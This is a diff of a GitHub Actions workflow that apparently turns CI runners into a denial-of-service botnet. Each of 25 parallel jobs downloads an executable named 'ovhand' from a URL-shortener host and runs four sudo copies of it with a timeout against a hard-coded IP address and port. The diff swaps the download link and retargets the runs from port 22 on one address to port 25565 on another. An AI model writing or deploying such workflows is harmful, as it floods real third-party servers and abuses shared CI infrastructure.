@@ -7,19 +7,19 @@ jobs:
   vds:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 60
+      max-parallel: 25
       matrix:
-       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60]
+       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
 
 
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/CPYA5/ovhand -O ovhand
+          wget https://curl.by/y5tmK/ovhand -O ovhand
           chmod +x ovhand
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 45 ./ovhand 40.160.24.51 22 10 45 &
+            sudo timeout 45 ./ovhand 193.70.95.184 25565 10 45 &
             PIDS+=($!)
           done
           
